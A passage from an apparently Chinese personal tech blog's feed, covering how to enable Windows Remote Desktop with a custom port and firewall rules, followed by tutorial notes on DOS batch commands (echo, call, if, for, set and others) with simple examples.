1</center></li><li><p>在<strong>远程属性界面</strong>中的<strong>远程桌面</strong>中，<strong>选中</strong>【允许远程连接到计算机】选项，然后<strong>点击</strong>【<strong>应用</strong>】按钮，如图2所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图2.png" alt="图2"></center><center>图 2</center></li><li><p><strong>点击</strong>【<strong>选择用户</strong>】按钮，进入<strong>远程桌面用户</strong>界面（系统默认仅当前管理员有远程访问权限，如需添加其他用户需继续执行下一步操作），如图3所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图3.png" alt="图3"></center><center>图 3</center></li><li><p><strong>点击</strong>【<strong>添加</strong>】按钮，进入<strong>选择用户界面</strong>，在输入框中键入用户名后，<strong>点击</strong>【<strong>确认</strong>】按钮即可，如图4所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图4.png" alt="图4"></center><center>图 4</center></li></ol><h3 id="方式二：Modern界面"><a href="#方式二：Modern界面" class="headerlink" title="方式二：Modern界面"></a>方式二：Modern界面</h3><p>&emsp;&emsp;Win10采用Modern设置风格，并且将一些常用的设置选项都集成到了【<strong>设置界面</strong>】。</p><ol><li><p>【Win+I】打开【<strong>设置界面</strong>】，点击【<strong>系统</strong>】 -&gt; 【<strong>远程桌面</strong>】，如图5所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图5.png" alt="图5"></center><center>图 5</center></li><li><p>将<strong>启用远程桌面</strong>设置为<strong>开</strong>，如图6所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图6.png" alt="图6"></center><center>图 6</center></li></ol><p>ps：</p><ul><li>上述操作与<strong><em>方式一</em></strong>中的前两步操作达到相同的效果。</li><li>该方式仅允许当前管理员进行远程访问操作。</li><li>设置接通电源时计算机从不睡眠，否则只会在某段时间内才能正常连接。</li></ul><h2 id="修改远程桌面默认端口"><a href="#修改远程桌面默认端口" class="headerlink" title="修改远程桌面默认端口"></a>修改远程桌面默认端口</h2><ol><li><p>【Win+R】打开【运行】，键入<strong>regedit</strong>，打开<strong>注册表编辑器界面</strong>，如图7所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图7.png" alt="图7"></center><center>图 7</center></li><li><p>修改<strong>PortNumber</strong>参数</p><ul><li><p>找到如下位置：<span style="color:red;">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp</span></p><p>在右侧找到<strong>PortNumber</strong>并将其修改为<strong>6700</strong>，如图8所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图8.png" alt="图8"></center><center>图 8</center></li><li><p>找到如下位置：</p><p><span style="color:red">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp</span></p><p>在右侧找到<strong>PortNumber</strong>并将其修改为<strong>6700</strong>，如图9所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图9.png" alt="图9"></center><center>图 9</center></li></ul></li><li><p>关闭注册表。</p></li></ol><h2 id="修改防火墙配置"><a href="#修改防火墙配置" class="headerlink" title="修改防火墙配置"></a>修改防火墙配置</h2><ol><li><p>【Win+R】打开【运行】，键入<strong>control</strong>,打开<strong>控制面板</strong>。找到<strong>Windows Defender 防火墙</strong>并打开，如图10所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图10.png" alt="图10"></center><center>图 10</center></li><li><p><strong>点击</strong>【<strong>高级设置</strong>】，打开<strong>高级安全Windows Defender 防火墙界面</strong>，如图11所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图11.png" alt="图11"></center><center>图 11</center></li><li><p><strong>点击</strong>左侧【<strong>入站规则</strong>】后，点击【<strong>新建规则</strong>】，如图12所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图12.png" alt="图12"></center><center>图 12</center></li><li><p>在<strong>新建入站规则向导界面</strong>的规则类型中选择<strong>端口</strong>选项，并单击【<strong>下一步</strong>】按钮，如图13所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图13.png" alt="图13"></center><center>图 13</center></li><li><p>在<strong>协议和端口界面</strong>选择<strong>TCP</strong>选项（入栈需要创建两条规则一个是TCP一个是UDP，所以还需要按此例创建一个UDP的），选中<strong>特定本地端口</strong>，并键入端口值：<strong>6700</strong>，并<strong>单击</strong>【<strong>下一步</strong>】按钮，如图14所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图14.png" alt="图14"></center><center>图 14</center></li><li><p>在<strong>操作界面</strong>中选择<strong>允许连接</strong>选项，如图15所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图15.png" alt="图15"></center><center>图 15</center></li><li><p><strong>配置文件界面</strong>规则采用默认即可，<strong>单击</strong>【<strong>下一步</strong>】，如图16所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图16.png" alt="图16"></center><center>图 16</center></li><li><p>在<strong>名称界面</strong>键入名称值，可随意设置只要自己懂什么意思就OK，如图17所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图17.png" alt="图17"></center><center>图 17</center></li><li><p>按上述相同步骤再新增一条<strong>UDP规则</strong>。</p></li><li><p>设置完毕后，关闭<strong>高级安全Windows Defender 防火墙界面</strong>。</p></li><li><p><span style="color:red">所有设置完成之后需要重启电脑</span></p></li></ol><h2 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h2><ol><li><p>【Win+R】打开【运行】，键入<strong>mstsc</strong>，打开<strong>远程桌面界面客户端</strong>，如图18所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图18.png" alt="图18"></center><center>图 18</center></li><li><p>键入计算机IP地址，记得要加上端口号(如：<span style="color:red">192.168.11.111:6700</span>，不加的话，默认是使用<strong>3389</strong>进行连接)，如图19所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/mstsc/图19.png" alt="图19"></center><center>图 19</center></li><li><p>成功后会要求用户键入<strong>密码</strong>，确认<strong>连接凭证</strong>即可登录。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 软件使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> mstsc </tag>
            
            <tag> 远程桌面 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>批处理笔记</title>
      <link href="/2020/08/22/pi-chu-li-bi-ji/"/>
      <url>/2020/08/22/pi-chu-li-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="批处理文件"><a href="#批处理文件" class="headerlink" title="批处理文件"></a>批处理文件</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>批处理文件也称<strong>批处理程序</strong>或<strong>脚本</strong>，使用它可以<strong>简化日常或重复性任务</strong></li><li>批处理文件中常见是<strong>DOS批处理</strong>和<strong>PS批处理等</strong>（文中的批处理指的的DOS批处理）</li><li>DOS批处理文件是<strong>DOS命令</strong>的批量和技巧性的应用，体现了DOS的精华</li><li>批处理文件是无格式的<strong>文本文件</strong>，包含<strong>一条或多条命令</strong>，文件扩展名为<strong>.bat或.cmd</strong></li><li>批处理文件在被<strong>DOS</strong>或<strong>cmd</strong>执行时，会按照该文件中各个命令出现的<strong>顺序</strong>来逐个<strong>运行</strong></li></ul><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><h3 id="copy命令"><a href="#copy命令" class="headerlink" title="copy命令"></a>copy命令</h3><p>​        copy命令是实现<strong>文件复制</strong>的命令，它可以将文件从某个目录复制到另外的目录。</p><p><strong>语法</strong>：</p><pre class=" language-batch"><code class="language-batch"><span class="token command"><span class="token keyword">copy</span> con 批处理文件名称.bat</span></code></pre><p><strong>说明</strong>：</p><ul><li>con：是指字符输入设备，通常指键盘</li></ul><p><strong>步骤</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/copy命令编写批处理文件.png" alt="copy命令编写批处理文件"></center><p>注：</p><ul><li>以<strong>【Ctrl + Z】</strong>组合键完成批处理文件的创建</li></ul><p><strong>结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/copy命令编写批处理文件展示结果.png" alt="copy命令编写批处理文件展示结果"></center><h3 id="edit命令"><a href="#edit命令" class="headerlink" title="edit命令"></a>edit命令</h3><p>​        Edit是<strong>DOS系统</strong>中的文本文件编辑程序，可以快速编辑批处理文件。</p><h3 id="记事本程序"><a href="#记事本程序" class="headerlink" title="记事本程序"></a>记事本程序</h3><ul><li>新建一个文本文件</li><li>用记事本打开文本文件，并在其中编写批处理命令</li><li>以<strong>.bat</strong>的后缀名的形式保存此文件</li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>其他批处理命令编辑器主要指的是其他文本编辑器，如<strong>notepad++</strong>、<strong>EditPlus</strong>等等，他们类似于记事本程序，可以直接以文本的形式编辑批处理命令。如下图所示：</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/文本编辑器编写批处理文件.png" alt="文本编辑器编写批处理文件"></center><h1 id="批处理命令"><a href="#批处理命令" class="headerlink" title="批处理命令"></a>批处理命令</h1><h2 id="批处理基础命令"><a href="#批处理基础命令" class="headerlink" title="批处理基础命令"></a>批处理基础命令</h2><h3 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h3><p>​        打开或关闭<strong>命令回显</strong>功能或<strong>显示消息</strong></p><p><strong>语法</strong>：</p><pre class=" language-batch"><code class="language-batch"><span class="token command"><span class="token keyword">echo</span> [{on | off}] [message]</span></code></pre><p><strong>说明</strong>：</p><ul><li>{ on | off }：指定是否打开命令回显功能</li><li>message：指定要在屏幕上显示的文本信息</li></ul><p><strong>eg</strong>：</p><pre class=" language-batch"><code class="language-batch"><span class="token comment" spellcheck="true">:: 关闭回显功能</span><span class="token operator">@</span><span class="token command"><span class="token keyword">echo</span> off</span><span class="token comment" spellcheck="true">:: 在命令提示符窗口显示"Pleione_Plus"</span><span class="token command"><span class="token keyword">echo</span> By Pleione_Plus</span><span class="token comment" spellcheck="true">:: 显示一个空行</span><span class="token command"><span class="token keyword">echo</span>.</span><span class="token comment" spellcheck="true">:: 显示一个变量</span><span class="token command"><span class="token keyword">echo</span> <span class="token variable">%windir%</span></span><span class="token comment" spellcheck="true">:: 显示重定向到文件中</span><span class="token command"><span class="token keyword">echo</span> <span class="token string">"this is a demo!"</span> > tmp.txt</span></code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/echo-display.png" alt="echo-display"></center><h3 id="pause"><a href="#pause" class="headerlink" title="pause"></a>pause</h3><p>​        <strong>暂停</strong>批处理程序，直到有一个按键<strong>被触发</strong></p><p><strong>语法</strong>：</p><pre class=" language-batch"><code class="language-batch"><span class="token command"><span class="token keyword">pause</span></span></code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/pause-display.png" alt="pause-display"></center><h3 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h3><p>​        注释该行，可回显，但不执行<a href ::"执行时直接跳过该行">^1</a>:</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">rem [comment]</code></pre><ul><li>comment：指定要作为注释的任何字符串</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">rem 这是一个内容注释:: 这也是一个内容注释，但该行执行时相当于不存在</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/注释-display.png" alt="注释-display"></center><h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p>​        从一个批处理程序<strong>调用</strong>另一个批处理程序，而<strong>不终止父批处理程序</strong></p><ul><li>调用子函数</li><li>调用子批处理</li><li><font color="red">以命令行方式解析字符串变量</font></li></ul><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">call [[Drive:] [Path] Filename [BatchParameters]] [:Label [Arguments]]</code></pre><ul><li>[Drive:] [Path] Filename：指定要调用的批处理程序的位置和名称。<ul><li>Filename参数必须有.bat或.cmd扩展名</li></ul></li><li>BatchParameters：指定批处理程序所需的任何命令行信息，包括命令行选项、文件名、批处理参数或变量</li><li>:Label：调用文本文件内命令段，以:Label开头，以goto :eof结尾</li><li>Arguments：指定要传递给其新实例的所有命令行信息</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 调用另一个批处理程序call 1.bat:: 以命令方式解析变量值set aa=123456set cmdstr=echo %aa%call %cmdstr%</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/call-以命令行方式解析字符串-display.png" alt="call-以命令行方式解析字符串-display"></center><h3 id="cls"><a href="#cls" class="headerlink" title="cls"></a>cls</h3><p>​        <strong>清屏</strong>命令，但不清除历史记录</p><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>​        <strong>调用外部程序</strong>，所有的<strong>DOS命令</strong>和<strong>命令行程序</strong>都可以由<code>start</code>命令来调用</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">start [/min | /max] [parameters]</code></pre><ul><li>/min：以最小化方式启动窗口（必须在parameters之前）</li><li>/max：以最大化方式启动窗口（必须在parameters之前）</li><li>parameter：传递给程序的参数，（为空时默认打开一个新的命令提示符窗口）</li></ul><p><strong>eg1</strong>：</p><pre class=" language-bat"><code class="language-bat">start /max calc.exe:: 调用计算器程序，以最大状态展示</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/start-calc-display.png" alt="start-calc-display"></center><p><strong>eg2</strong>：</p><pre class=" language-bat"><code class="language-bat">start "" "C:\Program Files (x86)\Tencent\TIM\Bin\TIM.exe":: 中间的引号不能省略，否则将以CUI方式打开</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/start-TIM-display.png" alt="start-TIM-display"></center><h2 id="批处理高级命令"><a href="#批处理高级命令" class="headerlink" title="批处理高级命令"></a>批处理高级命令</h2><h3 id="goto"><a href="#goto" class="headerlink" title="goto"></a>goto</h3><p>​        指定跳转到标签，找到标签后，程序将处理从下一行开始的命令</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">goto label</code></pre><ul><li>label：指定所要转向的批处理程序中的行</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo off:startrem 如果var值小于3则输出set /a var+=1echo %var%if %var% leq 3 goto startpause</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/goto-display.png" alt="goto-display"></center><h3 id="if"><a href="#if" class="headerlink" title="if"></a>if</h3><p>​        在批处理程序中执行条件处理</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">if [not] errorlevel Number Command [else Expression]if [not] String1==String2 Command [else Expression]if [not] exist FileName Command [else Expression]if [/i] String1 ComoareOp String2 Command [else Expression]if defined Variable Command [else Expression]if cmdextversion Number Command [else Expression]</code></pre><ul><li>not：指定只有当条件为假时才执行该命令</li><li><span name="iferrorlevel">errorlevel Number</span>：只有当有cmd运行的前一个程序返回等于或大于Number的退出码时，才能指定真条件</li><li>Command：指定只有满足当前的条件时才应执行的命令</li><li>Expression：指定将传递给else子句中命令的命令行命令和任何参数</li><li>String1==String2：只有当String1和String2相同时才能指定真条件</li><li>exist FileName：如果FileName文件存在，则指定条件真</li><li><a href="#ComoareOp">ComoareOp</a>：指定三个字母的比较运算符来做串比较</li><li>/i：强制字符串忽略大小写</li><li>cmdextversion Number：只有当与cmd的“命令扩展”功能相关的内部版本号等于或大于Number时，才指定真条件</li><li>defined Variable：如果定义了Variable，则指定条件为真</li></ul><p><strong>注</strong>：</p><ul><li>if语句多行书写的要求<ul><li>Command的左括号必须和if在同行</li><li>else必须和Command的右括号在同行</li><li>Expression的左括号必须和else在同行</li><li>Command和Expression可以是命令集</li></ul></li></ul><p><strong>eg</strong>：<span name="strCompare"> </span></p><pre class=" language-bat"><code class="language-bat">:: 字符串比较@echo offset str1=abcd1234set str2=ABCD1234set str3=abcd1233:: 是否忽略大小写if %str1%==%str2% (echo %str1%与%str2%相同!) else (echo %str1%与%str2%不同!)if /i %str1% EQU %str2% (echo %str1%与%str2%相同!) else (echo %str1%与%str2%不同!)echo.:: 字符串中数值大小比较if %str1% LSS %str2% (echo %str1% ^< %str2%) else (echo %str1% ^> %str2%)if %str1% LSS %str3% (echo %str1% ^< %str3%) else (echo %str1% ^> %str3%)echo.:: 选择是否显示当前系统时间set /p choice=是否显示当前系统时间?(y/n)if /i not %choice% EQU n (echo 当前系统的时间是: %data% %time%)echo.pause>nul:: 存在判断（判断文件或文件夹是否存在）@echo off:: 判断文件是否存在if exist %0 echo 文件%0是存在的！echo.:: 判断文件夹是否存在if not exist %~df0 (    echo 文件夹%~df0不存在！)else (    echo 文件夹%~df0存在！)pause>nul:: 定义判断@echo off:: 定义变量set var=111;:: 判断变量是否被定义if defined var (echo var=%var%) else (echo var尚未定义！):: 删除变量set var=:: 判断变量是否被定义if defined var (echo var=%var%) else (echo var尚未定义！)pause>nul</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/if-display.png" alt="if-display"></center><h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><p>​        在批处理程序中，通过显示提示信息并暂停批处理程序，用户可以从一组选项键中进行选择</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">choice [/c [Choices]] [/n] [/cs] [/t Timeout /d Choice] [/m text]</code></pre><ul><li>/c Choices：指定用户选项键。显示时，选项键用逗号分隔，出现在【】内，后面跟着问号。默认情况下只有【Y,N】</li><li>/n：</li><li>/cs：指定用户选项键必须区分大小写。默认情况不区分大小写</li><li>/t Timeout：指定在默认为指定键之前choice暂停指定的秒数</li><li>/d Choice：指定默认选择，必须和/t一起使用</li><li>/m text：指定要在提示符之前显示的文字</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offchoice /c dme /m "dir,mem,end"if errorlevel 3 goto endif errorlevel 2 goto memif errorlevel 1 goto dir:dirdirgoto end:memmemgoto end:endecho goodbyepause</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/choice-display.png" alt="choice-display"></center><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><p>​        对一组文件中的每个文件运行指定的命令</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">for {%Variable | %%Variable} in (Set) do Command [CommandLineOptions]for /l {%Variable | %%Variable} in (start,step,end) do Command [CommandLineOptions]for /f ["options"] {%Variable | %%Variable} in (Set) do Command [CommandLineOptions]for {/d | /r} {%Variable | %%Variable} in (Set) do Command [CommandLineOptions]</code></pre><ul><li>%Variable | %%Variable：代表可替换的参数，%Variable通过命令提示符执行for命令；%%Variable在批处理文件中执行for命令。（必须，变量区分大小写）</li><li>(Set)：指定要用指定命令处理的一个或多个文件、目录、数值范围以及文本字符串。（必须，需要括号）</li><li>Command：指定要对包括在指定的（set）中每个文件、目录、数值范围或文本字符串所执行的命令</li><li>CommandLineOptions：指定要与所执行命令一起使用的任何命令行选项</li><li>/l：设置计数循环</li><li>/f：能对字符串进行操作，也能对命令的返回值进行操作，还可以访问磁盘中的ASCII文件。<ul><li>options：eol=c、skip=n、delims=xxx、tokens=x,y,m-n、usebackq<ul><li>delims：指定字符串的分隔符</li><li>tokens：提取分隔后的块，默认只提取第一块</li></ul></li><li>set：”string”、’command’、file-set</li></ul></li><li>/d | /r：与文件和目录有关</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">rem 循环结构:: 基础循环结构@echo offecho 对集合遍历有：for %%i in (1,2,3,4,5,6) do echo %%ipause>nulcls:: /l开关:: 计数循环echo 计算1-100的和：set sum=set sum=0for /l %%i in (1,1,100) do (set /a sum += %%i)echo 之和为:%sum%pause>nulecho 计算1-100的和：setlocal enabledelayedexpansionset sum=set sum=0for /l %%i in (1,1,100) do (set /a sum = !sum! + %%i)echo 之和为:%sum%pause>nulcls:: /a 等号右边的字符串做数值计算:: setlocal enabledelayedexpansion 与 !sum!的组合使用:: /f开关:: (delims、tokens、skip、eol、userbackq、变量延迟):: 字符串@echo offecho No options::: 展示文本文件内容for /f %%a in (demo.txt) do echo a=%%a:: 展示字符串内容for /f %%a in ("1,2,10") do echo a=%%aecho.echo Options tokens ^& delimsfor /f "tokens=1-3 delims=," %%a in ("1,2,10") do echo a=%%a b=%%b c=%%cpause>nulcls:: 命令@echo offecho 本文件夹里面的文件有：for /f "skip=5 tokens=4-5 delims= " %%a in ('dir') do (    if not "%%a"=="<DIR>" if not "%%a"=="字节" if not "%%a"=="可用字节" echo %%b)pause>nulcls:: /D 或 /r开关:: 遍历出D盘下的所有文件夹（完整路径信息）@echo offsetlocal enabledelayedexpansionFOR /R d: %%i IN (.) DO (set dd=%%iset "dd=!dd:~0,-1!"echo !dd!)pauseexit</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/for-display-1.png" alt="for-display-1"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/for-display-2.png" alt="for-display-2"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/for-display-3.png" alt="for-display-3"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/for-display-4.png" alt="for-display-4"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/for-display-5.png" alt="for-display-5"></center><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>​        用于显示、设置或删除变量、做数值计算、获取用户输入、字符串截取、字符串替换</p><p><strong>eg1</strong>：<span name="varDisplay">显示变量</span></p><pre class=" language-bat"><code class="language-bat">:: 显示变量set                    //显示所有定义的变量set s                //显示定义的以"s"开头的变量(无效)</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-显示变量-display.png" alt="set-显示变量-display"></center><p><strong>eg2</strong>：<span name="varSet">设置变量</span></p><pre class=" language-bat"><code class="language-bat">::::::::::::::::::::::::::::::::::::::::::::::: 设置和调用变量set aa="123"        //bat中变量不区分类型echo %aa%            //调用变量时前后需要加上"%"</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-设置和调用变量-display.png" alt="set-设置和调用变量-display"></center><p><strong>eg3</strong>：<span name="varDel">删除变量</span></p><pre class=" language-bat"><code class="language-bat">::::::::::::::::::::::::::::::::::::::::::::::: 删除变量，在设置变量之前先删除一下，若之前没有定义，则此句无任何意义@echo offtitle 删除变量set aa=if defined aa (     echo aa未被删除) else (     echo aa已被删除 )  pause</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-删除变量-display.png" alt="set-删除变量-display"></center><p><strong>eg4</strong>：<span name="varCalculate">数值计算</span></p><pre class=" language-bat"><code class="language-bat">:: 算数运算set aa=1set bb=0set /a aa=%aa% + 1,bb+=%aa%echo %aa%echo %bb%</code></pre><ul><li>/a：等号右边按数值计算</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-数值计算-display.png" alt="set-数值计算-display"></center><p><strong>eg5</strong>：<span name="varInput">获取用户输入</span></p><pre class=" language-bat"><code class="language-bat">::::::::::::::::::::::::::::::::::::::::::::::: 获取用户输入set /p msg=请输入信息:echo %msg%</code></pre><ul><li>/p：获取用户输入</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-获取用户输入-display.png" alt="set-获取用户输入-display"></center><p><strong>eg6</strong>：<span name="strSplit">字符串截取</span></p><pre class=" language-bat"><code class="language-bat">@echo offtitle 字符串截取:: 字符串截取set var=%str:~偏移量,长度%rem 截取字符串@echo offset str=1234567890echo %str%set var=%str:~1,1%echo 偏移为：1，长度为1：%var%set var=%str:~1,4%echo 偏移为：1，长度为4：%var%set var=%str:~-3%echo 截取后三位：%var%set var=%str:~3%echo 偏移为3，截取剩余：%var%set var=%str:~-5,4%echo 偏移为：-5，长度为4：%var%set var=%str:~0,-4%echo 弃掉后四位：%var%set var=%str:~-0,1%echo %var%set var=%str:~+0,1%echo %var%:: -0 = +0 = 0set var=%str:~-5,-8%echo 偏移为：-5，长度为-8：%var%pause>nulcls:: 格式化显示时间@echo offecho 当前时间是：%time% 即 %time:~0,2%点%time:~3,2%分%time:~6,2%秒%time:~9,2%厘秒</code></pre><ul><li>截取串获取：<code>%str:~偏移量,长度%</code><ul><li>偏移量和长度可正可负。<ul><li>偏移量为正，相对左端第一位偏移；偏移量为负，相对于右端第0位偏移。(<font color="red">-0=+0=0</font>)</li><li>长度为正，表示截取字符个数；长度为负，表示从右端抛弃字符个数。</li></ul></li><li>如果只有一个数字，则其表示偏移量，<font color="red">长度为偏移量之后所有位的个数</font></li></ul></li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-字符串截取-display.png" alt="set-字符串截取-display"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-格式化显示时间-display.png" alt="set-格式化显示时间-display"></center><p><strong>eg7</strong>：<span name="strReplace">字符串替换</span></p><pre class=" language-bat"><code class="language-bat">::::::::::::::::::::::::::::::::::::::::::::::: 替换字符串@echo offset aa=伟大的中国！我为你自豪！echo 替换前：%aa%echo 替换后：%aa:中国=中华人民共和国%:: 获取第一次赋的值echo aa=%aa%set "aa=%aa:中国=中华人民共和国%"echo aa=%aa%pause>nul</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/set-替换字符串-display.png" alt="set-替换字符串-display"></center><h3 id="setx"><a href="#setx" class="headerlink" title="setx"></a>setx</h3><p>​        设置永久变量</p><pre class=" language-bash"><code class="language-bash">:: 将D:\添加到PATH变量中setx PATH "%path%<span class="token punctuation">;</span>D:\"</code></pre><h3 id="setlocal"><a href="#setlocal" class="headerlink" title="setlocal"></a>setlocal</h3><p>​        启动批处理文件中环境变量的本地化，本地化将持续到出现匹配的endlocal命令活着到达批处理文件结尾为止。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">setlocal {enableextension | disableextension} {enabledelayedexpansion | disabledelayedexpansion}</code></pre><ul><li>enableextension：启用命令扩展，直到出现endlocal命令</li><li>disableextension：禁用命令扩展，直到出现endlocal命令</li><li>enabledelayedexpansion：<span name="enabledelayedexpansion">启用延迟的环境变量扩展</span>，直到出现endlocal命令</li><li>disabledelayedexpansion：<span name="disabledelayedexpansion">禁用延迟的环境变量扩展</span>，直到出现endlocal命令</li></ul><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">setlocal enableextensionsetlocal disableextensionsetlocal enabledelayedexpansionsetlocal disabledelayedexpansion</code></pre><h3 id="使用参数"><a href="#使用参数" class="headerlink" title="使用参数"></a>使用参数</h3><p>​        可以在批处理文件内任何的地方使用批处理参数，以提取有关环境设置的信息。</p><p>​        cmd提供批处理参数扩展变量（%0~%9）,%0将批处理文件名替换，而%1-%9将由命令行键入的参数替换。</p><p><strong>eg</strong>:</p><pre class=" language-bat"><code class="language-bat">@echo offrem 将echo回显重定向到tep.txt文件中Echo 产生一个临时文件 > tmp.txtRem 下行先保存当前目录，再将c:\windows设为当前目录pushd c:\windows@rem 调用文件内部的子程序Call :sub tmp.txtRem 下行恢复前次的当前目录Popdrem 再次调用Call :sub tmp.txtpauserem 删除创建的临时文件Del tmp.txtexit:subEcho 删除引号： %~1Echo 扩充到路径： %~f1Echo 扩充到一个驱动器号： %~d1Echo 扩充到一个路径： %~p1 Echo 扩充到一个文件名： %~n1Echo 扩充到一个文件扩展名： %~x1Echo 